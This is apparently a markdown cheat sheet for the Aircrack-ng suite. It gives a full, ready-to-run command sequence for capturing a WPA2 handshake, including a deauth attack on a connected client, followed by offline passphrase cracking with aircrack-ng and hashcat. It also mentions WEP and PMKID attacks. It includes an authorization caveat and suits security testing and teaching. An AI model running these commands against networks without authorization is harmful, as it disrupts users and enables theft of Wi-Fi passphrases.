# Aircrack-ng

Aircrack-ng is a **Wi-Fi security auditing suite**. The classic use is capturing a WPA/WPA2 4-way handshake and cracking the passphrase offline with a wordlist. It needs a wireless adapter that supports **monitor mode and packet injection** (e.g. Alfa AWUS036 chipsets).

## The suite (main binaries)

- **airmon-ng** - enable/disable monitor mode
- **airodump-ng** - capture packets / discover networks and clients
- **aireplay-ng** - inject packets (deauth to force a handshake)
- **aircrack-ng** - crack WEP/WPA handshakes
- **airbase-ng** - create rogue APs

## Full WPA2 handshake capture + crack

```bash
# 1. Put the card into monitor mode (kill interfering processes first)
sudo airmon-ng check kill
sudo airmon-ng start wlan0            # creates wlan0mon

# 2. Discover networks - note the BSSID and CHANNEL of the target
sudo airodump-ng wlan0mon

# 3. Focus capture on the target AP + channel, write to file
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon

# 4. Deauth a connected client to force a re-handshake (new terminal)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
#    Watch for "WPA handshake: AA:BB:.." in the airodump window

# 5. Crack the captured handshake with a wordlist
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# 6. Restore normal networking
sudo airmon-ng stop wlan0mon
```

## Notes on cracking

- WPA/WPA2-PSK is only crackable **offline against the handshake** - success depends entirely on the wordlist. Strong passphrases won't fall.
- For GPU speed, convert and crack with hashcat:

```bash
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

- **WEP** is broken and crackable in minutes by collecting enough IVs (`aircrack-ng` on the .cap directly).
- **PMKID** attack can grab a hash without any client (`hcxdumptool`).

## Legal / ethical

Only test networks you **own or are explicitly authorized** to assess. Deauth attacks disrupt real users and are illegal against networks you don't control.

## Resources

- [Aircrack-ng documentation](https://www.aircrack-ng.org/documentation.html)
